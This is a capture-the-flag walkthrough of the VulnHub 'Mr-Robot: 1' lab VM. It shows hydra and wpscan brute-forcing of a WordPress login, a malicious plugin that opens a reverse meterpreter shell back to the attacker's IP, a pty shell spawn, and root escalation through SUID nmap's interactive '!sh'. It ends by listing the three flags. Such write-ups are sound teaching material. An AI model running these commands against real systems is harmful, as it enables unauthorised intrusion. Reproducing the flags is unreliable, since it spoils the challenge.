# Mr-Robot: 1
[VulnHub link](https://www.vulnhub.com/entry/mr-robot-1,151/)  
By Leon Johnson

* We are first greeted with a login page that is in command-line style, requiring users to specify both the username and the password:
![](/screenshots/mr-robot-1/Login.jpg)
* We try some common login credentials such as `admin:admin` and `admin:password`, which do not work.
* Run `nmap 10.0.2.*`, where we find 5 live hosts:
![](/screenshots/mr-robot-1/nmapScan.jpg)
* After eliminating our own IP address (`ifconfig`: 10.0.2.15) and our router gateway IP address (`route -n`: 10.0.2.1), there are 3 remaining hosts.
* Out of these 3 hosts, `10.0.2.5` can run SSH, HTTP and HTTPS services (of which the ports for the latter 2 are open), which tells us that there is likely a web server running on the host. We will start exploring this live host first.
* Run `nmap -p- -A 10.0.2.5`:
![](/screenshots/mr-robot-1/hostFullScan.jpg)
* True enough, we see an Apache HTTP server program running in the host.
* Open `10.0.2.5` on our browser and we get an interactive-style page greeting us, leaving us with a "terminal" where we can execute several restricted commands:
![](/screenshots/mr-robot-1/interactiveSite.jpg)
* Executing any of the commands yields either a video or a series of stories with pictures. `join` prompts for an email, but nothing noteworthy happens out of it either.
* Opening the page source, there does not seem like there is anything interesting to be extracted as well:
![](/screenshots/mr-robot-1/interactiveSitePageSource.jpg)
* Next, we will use `uniscan` which is a Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. -q enables directory checks, -w enables file checks and -e enables robots.txt and sitemap.xml check.
* Run `uniscan -u 10.0.2.5 -qwe`:
![](/screenshots/mr-robot-1/uniscanResults.jpg)
* Note: In the previous walkthrough on basic-pentesting-1, we used `dirbuster`, but here we are using `uniscan` which has other kinds of checks such as static and dynamic ones that the former does not have.
* From the scan results, we see that the site is running on WordPress, since the directory checks included links that ended with `wp-`.
* There is a robots.txt found from the scan's file checks. Open it and we see that there are 2 files listed: `fsocity.dic` and `key-1-of-3.txt`. The former is an unordered dictionary wordlist, while the latter reveals a string: `073403c8a58a1f80d943455fb30724b9`.
* It is likely that the dictionary file will be required for some sort of bruteforce attack later.
* We are not quite sure if there is anything more to the string, but since it looks like a hash value, we will run `hash-identifier` against it:
![](/screenshots/mr-robot-1/hashIdentifierResults.jpg)
* It is likely that the string is a MD5 hash. Using several online MD5 cracker pages, there are no matches found to the hash value, so we will leave it at that for now.
* `sitemap.xml` yields nothing of interest:
![](/screenshots/mr-robot-1/sitemapXml.jpg)
* Head to the wp-login page of the WordPress site, and we try to login with some common login credentials. We find that the user `admin` does not exist ("invalid username").
* We have to find a way to see actual WordPress posts on the site (if any), since clicking "← Back to user's Blog!" on the login page brings us back to the interactive page that we initially encountered (which did not quite show us how we are able to escape that page to head to other pages of the site).
* To do so, we add a random parameter string to the end of the site (e.g. `/100`), in order to get the error message that the page cannot be found:
![](/screenshots/mr-robot-1/invalidPage.jpg)
* However, we are not able to find any posts on the site.
* Note: The walkthrough [here](https://www.youtube.com/watch?v=1-a-P1Q2AnA&t=322s) on YouTube shows that there is a post on the WordPress site, with the user `elliot`. The author of the vulnerable VM is likely to have removed this only post for the latest version.
* Run `wpscan --url 10.0.2.5 --enumerate u`, a black box WordPress vulnerability scanner, to see if we can obtain any usernames of accounts on the WordPress site:
![](/screenshots/mr-robot-1/wpScanUsers.jpg)
* Interestingly, we have no user results found (*which I am not sure why*).
* I guess this is where we have to use the dictionary wordlist that we had found earlier to find a valid username.
* We will run `hydra -V -L fsocity.dic -p testpassword 10.0.2.5 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username'`, where hydra is a parallelized login cracker which supports numerous protocols to attack:
![](/screenshots/mr-robot-1/hydraUsername.jpg)
* An exisiting WordPress username (`Elliot`) was found almost immediately after the cracker started its run, i.e. the username was found near the top of the dictionary list.

Explanation of how the `hydra` command works:
* `-V`: show login (username) and password for each attempt (can be omitted, will display only the valid username once found; however, if you want to see that hydra is doing its work, include this parameter).
* `-p testpassword`: we are not trying to crack passwords of a known user here so instead of testpassword, you can insert any random string as the password.
* In the parameters after specifying the protocol (`http-post-form`) to use, we insert 3 more parameters: the link to the login site, where the username and password which hydra will test will go, and how to determine the success/failure of each attempt.
* To find out where the login credentials will go, we have to open the page source of the login form and take the `name` attribute values for the username and password input fields respectively:
![](/screenshots/mr-robot-1/loginFormPageSource.jpg)
* Next, we need to find a string that distinguishes between a success/failure case. In this case, `Invalid username` is what hydra will see in most of its attempts, and it will flag those outcomes with this particular substring in its results as failed cases.
* Note: We cannot use the string `Error` to distinguish because even if we get a valid username, the page will still flag it as a negative result because the result page will still contain an error message, since the password is incorrect. Thus, we will only get negatives from the hydra scan.
* Having found an existing username `Elliot` for the WordPress site, our next step is to brute-force the password for that account.
* Note: The username is **case-insensitive** in our case, i.e. you can login as user `elliot` as well, which is considered the same as `Elliot`.

# Brute-force elliot's password using hydra #
* We will similarly use `hydra` to brute-force the password for user Elliot. However, before we begin the brute-forcing process, we have to realise that there are 858,160 lines in the dictionary wordlist (run `wc -l fsocity.dic` to find out), which means that hydra will try a total of 858,160 passwords.
* During the first 1 minute, hydra made around 1,100 attempts on my Kali VM (with the additional parameters of `-t 40 -w 1`: 40 connects in parallel and maximum 1 second wait for responses). The worst-case scenario of trying every single line as a password is that it would take around 12 hours to crack the password, which is way too long.
* Let us examine the dictionary wordlist to see if we are able to reduce the number of attempts that we have to make in the worst-case scenario.
* There might be duplicates in the wordlist, so we will sort the list first, then remove the duplicates: `cat fsocity.dic | sort | uniq > fsocity2.dic`. After doing so, we see that there are now only 11,451 lines within the modified wordlist (fsocity2.dic), which is just 1+% of the original wordlist. We are very much likely to get the password in under 10 minutes this time.
* Run `hydra -l elliot -P fsocity2.dic 10.0.2.5 http-post-form '/wp-login.php:log=elliot&pwd=^PASS^:S=Dashboard'`:
![](/screenshots/mr-robot-1/hydraBruteForcePassword.jpg)
* It took around 10 minutes for me to get the password `ER28-0652`.
* To-do: *Perhaps find some alternative configuration to speed up the brute-forcing process because `wpscan` took only a minute vs. hydra's 10 minutes*.

# Brute-force elliot's password using wpscan #
* Use `wpscan` instead to brute-force the password for user elliot: run `wpscan --url 10.0.2.5 --usernames elliot --passwords fsocity2.dic`:
![](/screenshots/mr-robot-1/wpScanBruteForcePassword.jpg)
* It took only around a minute to get the password `ER28-0652`, which was way faster than our attempt using `hydra`.
* Note: If you were to run the same command again, you would get the results almost instantly, i.e. results were very likely to have been cached.

* Besides the many repetitions in the orginal list, the password is also found somewhere at the end of the file, thus it took quite some time to get it.
* After logging in as elliot, we find that we are able to see the full panel on the left-hand side of the wp-admin page. To confirm that we have full access to the site, we check `Users`, and find that elliot indeed has administrator privileges.
* We will install and use the `malicious-wordpress-plugin` by `wetw0rk` [(GitHub link)](https://github.com/wetw0rk/malicious-wordpress-plugin), as we did in [basic-pentesting-1](https://github.com/leegengyu/CTF-Walkthrough/blob/master/basic-pentesting-1.md).
* Run `python wordpwn.py 10.0.2.15 4000 Y` after cloning the repository, upload `malicious.zip` as a plugin, and then activate it.
* Next, head to `10.0.2.5/wp-content/plugins/malicous/wetw0rk_maybe.php` on our browser to connect to the reverse shell.
* Heading back to our Kali terminal, we see that a meterpreter session has been opened.
* Navigate to our `home` directory and we find a directory called `robot`. Enter robot and we find key-2-of-3.txt and password.raw-md5:
![](/screenshots/mr-robot-1/robotDirectory.jpg)
* The key text file cannot be opened by us at the moment because the file is only readable by root, with no other permissions set. However, the password.raw-md5 file can be opened by us.
* We find the string `robot:c3fcd3d76192e4007dfb496cca67e13b` within the .raw-md5 file. The string is likely to mean that there is a username `robot` and password MD5 hash pair `c3fcd3d76192e4007dfb496cca67e13b`. 
* Using an online MD5 cracker page, we find that the password behind the hash is `abcdefghijklmnopqrstuvwxyz`.
* We can login via the command-line that greeted us when we booted up the vulnerable VM:
![](/screenshots/mr-robot-1/directLogin.jpg)
* Alternatively, we can execute `shell`, then get an interactive shell using `python -c 'import pty; pty.spawn("/bin/bash")'`. After that, run `su robot` to switch user and enter the password we found above.
* After logging in as robot, we find that we are able to open key-2-of-3.txt, which contains a string `822c73956184f694993bede3eb39f959`.
* We have to now find the last key, which is likely to be in /root, since the only thing which we have yet to do is to gain root access. However, even after logging in as robot, we do not have the permission to navigate to /root.
* We will do a privilege escalation here, using a binary which possess root privileges when they are executed (i.e. SUID executables).
* To search for these binaries, run `find / -user root -perm -4000 -print 2>/dev/null`:
![](/screenshots/mr-robot-1/suidExecutables.jpg)
* The commmand will print the files in the `/` directory owned by `root` that have SUID permission bits. Any errors encountered are redirected to `/dev/null`, listing only binaries that `robot` has access permissions.
* We will use `nmap`, whose version in the vulnerable VM is `3.8.1` (`nmap --version`). Older versions of nmap (2.0.2 to 5.2.1) have an interactive mode that allowed users to execute shell commands.
* Run `nmap`, `nmap --interactive` and then `!sh` to get a shell. `whoami` shows that we are now `root`.
* Head to /root and we find a number of files, amongst which is key-3-of-3.txt: `04787ddef27c3dee1ee161b21670b4e4`.
![](/screenshots/mr-robot-1/rootDirectory.jpg)
* There is also a file `firstboot_done`, which probably indicates to us that we are now done with this challenge (now that we have gotten all 3 keys as well)!

# Keys obtained #
* Key 1: 073403c8a58a1f80d943455fb30724b9
* Key 2: 822c73956184f694993bede3eb39f959
* Key 3: 04787ddef27c3dee1ee161b21670b4e4
